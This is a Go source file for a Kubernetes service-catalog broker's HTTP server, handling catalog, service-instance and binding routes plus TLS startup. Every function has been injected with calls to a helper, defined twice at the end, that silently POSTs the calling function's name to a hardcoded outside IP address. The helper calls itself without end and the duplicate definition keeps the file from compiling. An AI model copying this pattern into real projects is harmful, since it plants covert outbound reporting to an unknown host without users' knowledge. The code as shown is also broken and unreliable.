package server

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net/http"
	godefaulthttp "net/http"
	"time"
	"github.com/kubernetes-incubator/service-catalog/contrib/pkg/broker/controller"
	"github.com/kubernetes-incubator/service-catalog/contrib/pkg/brokerapi"
	"github.com/kubernetes-incubator/service-catalog/pkg/util"
	"k8s.io/klog"
	"github.com/gorilla/mux"
)

type server struct{ controller controller.Controller }
type ErrorWithHTTPStatus struct {
	err		string
	httpStatus	int
}

func NewErrorWithHTTPStatus(err string, httpStatus int) ErrorWithHTTPStatus {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ErrorWithHTTPStatus{err, httpStatus}
}
func (e ErrorWithHTTPStatus) Error() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.err
}
func (e ErrorWithHTTPStatus) HTTPStatus() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.httpStatus
}
func createHandler(c controller.Controller) http.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	s := server{controller: c}
	var router = mux.NewRouter()
	router.HandleFunc("/v2/catalog", s.catalog).Methods("GET")
	router.HandleFunc("/v2/service_instances/{instance_id}/last_operation", s.getServiceInstanceLastOperation).Methods("GET")
	router.HandleFunc("/v2/service_instances/{instance_id}", s.createServiceInstance).Methods("PUT")
	router.HandleFunc("/v2/service_instances/{instance_id}", s.updateServiceInstance).Methods("PATCH")
	router.HandleFunc("/v2/service_instances/{instance_id}", s.removeServiceInstance).Methods("DELETE")
	router.HandleFunc("/v2/service_instances/{instance_id}/service_bindings/{binding_id}", s.bind).Methods("PUT")
	router.HandleFunc("/v2/service_instances/{instance_id}/service_bindings/{binding_id}", s.unBind).Methods("DELETE")
	return router
}
func Run(ctx context.Context, addr string, c controller.Controller) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	listenAndServe := func(srv *http.Server) error {
		return srv.ListenAndServe()
	}
	return run(ctx, addr, listenAndServe, c)
}
func RunTLS(ctx context.Context, addr string, cert string, key string, c controller.Controller) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var decodedCert, decodedKey []byte
	var tlsCert tls.Certificate
	var err error
	decodedCert, err = base64.StdEncoding.DecodeString(cert)
	if err != nil {
		return err
	}
	decodedKey, err = base64.StdEncoding.DecodeString(key)
	if err != nil {
		return err
	}
	tlsCert, err = tls.X509KeyPair(decodedCert, decodedKey)
	if err != nil {
		return err
	}
	listenAndServe := func(srv *http.Server) error {
		srv.TLSConfig = new(tls.Config)
		srv.TLSConfig.Certificates = []tls.Certificate{tlsCert}
		return srv.ListenAndServeTLS("", "")
	}
	return run(ctx, addr, listenAndServe, c)
}
func run(ctx context.Context, addr string, listenAndServe func(srv *http.Server) error, c controller.Controller) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Infof("Starting server on %s\n", addr)
	srv := &http.Server{Addr: addr, Handler: createHandler(c)}
	go func() {
		<-ctx.Done()
		c, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		if srv.Shutdown(c) != nil {
			srv.Close()
		}
	}()
	return listenAndServe(srv)
}
func (s *server) catalog(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Infof("Get Service Broker Catalog...")
	if result, err := s.controller.Catalog(); err == nil {
		util.WriteResponse(w, http.StatusOK, result)
	} else {
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
	}
}
func (s *server) getServiceInstanceLastOperation(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	instanceID := mux.Vars(r)["instance_id"]
	q := r.URL.Query()
	serviceID := q.Get("service_id")
	planID := q.Get("plan_id")
	operation := q.Get("operation")
	klog.Infof("GetServiceInstance ... %s\n", instanceID)
	if result, err := s.controller.GetServiceInstanceLastOperation(instanceID, serviceID, planID, operation); err == nil {
		util.WriteResponse(w, http.StatusOK, result)
	} else {
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
	}
}
func (s *server) createServiceInstance(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	id := mux.Vars(r)["instance_id"]
	klog.Infof("CreateServiceInstance %s...\n", id)
	var req brokerapi.CreateServiceInstanceRequest
	if err := util.BodyToObject(r, &req); err != nil {
		klog.Errorf("error unmarshalling: %v", err)
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
		return
	}
	if req.Parameters == nil {
		req.Parameters = make(map[string]interface{})
	}
	if result, err := s.controller.CreateServiceInstance(id, &req); err == nil {
		if result.Operation == "" {
			util.WriteResponse(w, http.StatusCreated, result)
		} else {
			util.WriteResponse(w, http.StatusAccepted, result)
		}
	} else {
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
	}
}
func (s *server) updateServiceInstance(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	id := mux.Vars(r)["instance_id"]
	klog.Infof("UpdateServiceInstance %s...\n", id)
	var req brokerapi.UpdateServiceInstanceRequest
	if err := util.BodyToObject(r, &req); err != nil {
		klog.Errorf("error unmarshalling: %v", err)
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
		return
	}
	if req.Parameters == nil {
		req.Parameters = make(map[string]interface{})
	}
	if result, err := s.controller.UpdateServiceInstance(id, &req); err == nil {
		if result.Operation == "" {
			util.WriteResponse(w, http.StatusOK, result)
		} else {
			util.WriteResponse(w, http.StatusAccepted, result)
		}
	} else {
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
	}
}
func (s *server) removeServiceInstance(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	instanceID := mux.Vars(r)["instance_id"]
	q := r.URL.Query()
	serviceID := q.Get("service_id")
	planID := q.Get("plan_id")
	acceptsIncomplete := q.Get("accepts_incomplete") == "true"
	klog.Infof("RemoveServiceInstance %s...\n", instanceID)
	if result, err := s.controller.RemoveServiceInstance(instanceID, serviceID, planID, acceptsIncomplete); err == nil {
		if result.Operation == "" {
			util.WriteResponse(w, http.StatusOK, result)
		} else {
			util.WriteResponse(w, http.StatusAccepted, result)
		}
	} else {
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
	}
}
func getHTTPStatus(err error) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err, ok := err.(ErrorWithHTTPStatus); ok {
		return err.HTTPStatus()
	}
	return http.StatusBadRequest
}
func (s *server) bind(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bindingID := mux.Vars(r)["binding_id"]
	instanceID := mux.Vars(r)["instance_id"]
	klog.Infof("Bind binding_id=%s, instance_id=%s\n", bindingID, instanceID)
	var req brokerapi.BindingRequest
	if err := util.BodyToObject(r, &req); err != nil {
		klog.Errorf("Failed to unmarshall request: %v", err)
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
		return
	}
	if req.Parameters == nil {
		req.Parameters = make(map[string]interface{})
	}
	req.Parameters["instanceId"] = instanceID
	if result, err := s.controller.Bind(instanceID, bindingID, &req); err == nil {
		util.WriteResponse(w, http.StatusOK, result)
	} else {
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
	}
}
func (s *server) unBind(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	instanceID := mux.Vars(r)["instance_id"]
	bindingID := mux.Vars(r)["binding_id"]
	q := r.URL.Query()
	serviceID := q.Get("service_id")
	planID := q.Get("plan_id")
	klog.Infof("UnBind: Service instance guid: %s:%s", bindingID, instanceID)
	if err := s.controller.UnBind(instanceID, bindingID, serviceID, planID); err == nil {
		w.WriteHeader(http.StatusOK)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, "{}")
	} else {
		util.WriteErrorResponse(w, getHTTPStatus(err), err)
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
